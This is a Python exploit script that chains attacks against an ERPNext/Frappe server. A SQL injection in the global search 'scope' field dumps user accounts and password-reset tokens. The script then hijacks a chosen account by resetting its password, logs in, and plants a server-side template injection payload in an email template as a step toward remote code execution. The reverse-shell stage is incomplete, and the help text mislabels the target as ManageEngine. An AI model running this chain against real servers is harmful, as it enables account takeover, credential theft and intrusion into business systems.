#!/usr/env/python3

import argparse
import requests
import base64
import json

def sqliRequest(url,query,method="post",session=None):
    
    postData = {
        "cmd" : "frappe.utils.global_search.web_search",
        "text" : "twopoint",
        "scope" : f"\" {query} -- -"
    }

    proxies = {
        "http" : "http://127.0.0.1:8080"
    }

    if session != None:
        if method == "post":
            res = session.post(url+"/",data=postData)
        else:
            res= session.get(url+"/",data=postData)
    else:
        if method == "post":
            res = requests.post(url+"/",data=postData,proxies=proxies)
        else:
            res= requests.get(url+"/",data=postData)

    return res

def getAccounts(url):

    print("[~] Retrieving user accounts...")

    res = sqliRequest(url,"UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci from __Auth")

    userJson = json.loads(res.text)
    users = []
    for name in userJson['message']:
        users.append(name['route'])

    return users

def resetPassword(url,password,accounts=None):

    if accounts == None:
        print("[-] No accounts retrieved :(")
        exit()

    c = None
    while c not in range(1,len(accounts)+1):
        print("[?] Hijack which account?")
        for name in accounts:
            print(f"> {accounts.index(name)+1} : {name}")
        c = int(input(">>> "))

    victim = accounts[c-1]
    print(f"[!] Hijacking {victim}")

    print(f"[~] Sending password reset...")

    pwdData = {
        "cmd" : "frappe.core.doctype.user.user.reset_password",
        "user" : f"{victim}"
    }
    
    res = requests.post(url+"/",data=pwdData)

    print(f"[~] Retrieving reset token...")

    res = sqliRequest(url,f"UNION ALL SELECT 1,2,3,4,reset_password_key COLLATE utf8mb4_general_ci from tabUser where email = '{victim}'")
    tokenJson = json.loads(res.text)
    token = tokenJson['message'][0]['route']

    print(f"[~] Resetting password to {password}...")

    resetData = {
        "key" : f"{token}",
        "old_password" : "",
        "new_password" : f"{password}",
        "logout_all_sessions" : 1,
        "cmd" : "frappe.core.doctype.user.user.update_password"
    }
    res = requests.post(url+"/",resetData)

    print(f"[+] Password reset!")

    return victim

def sstiShell(url, lhost, lport, victim, password):

    print("[~] Logging with hijacked account...")

    sesh = requests.Session()
    loginData = {
        "cmd" : "login",
        "usr" : f"{victim}",
        "pwd" : f"{password}",
        "device" : "desktop"
    }
    sesh.post(url + "/",data=loginData)

    print("[~] Creating bad email template...")

    sstiData = {
        "doc" : f'{{"docstatus":0,"doctype":"Email Template","name":"New Email Template 1","__islocal":1,"__unsaved":1,"owner":"{victim}","__newname":"ssti2","subject":"ssti2","response":"<div>{{{{ 3 * 7 }}}}</div>"}}',
        "action" : "Save"
    }
    res = sesh.post(url + "/api/method/frappe.desk.form.save.savedocs", data=sstiData)
    triggerJson = json.loads(res.text)
    trigger = triggerJson['docs']

    print("[~] Finding RCE class route...")
    triggerData = {
        "template_name" : "ssti2",
        "doc" : trigger,
        "_lang" : ""
    }
    res = sesh.post(url + "/api/method/frappe.email.doctype.email_template.email_template.get_email_template", data=triggerData)
    classesJson = json.loads(res.text)
    print(classesJson)

    return

def main():
    
    print("// ERPNext Auth Bypass to SSTI RCE")

    # Praser
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Base URL of ManageEngine server", type=str)
    parser.add_argument("lhost", help="Local IP for listener", type=str)
    parser.add_argument("lport", help="Local port for listener", type=str)
    parser.add_argument("password", nargs="?", default="Twopoint123!", help="Password to reset account to.", type=str)
    args = parser.parse_args()

    accounts = getAccounts(args.url)
    victim = resetPassword(args.url,args.password,accounts)

    sstiShell(args.url,args.lhost,args.lport, victim, args.password)


    return

if __name__ == '__main__':
    main()
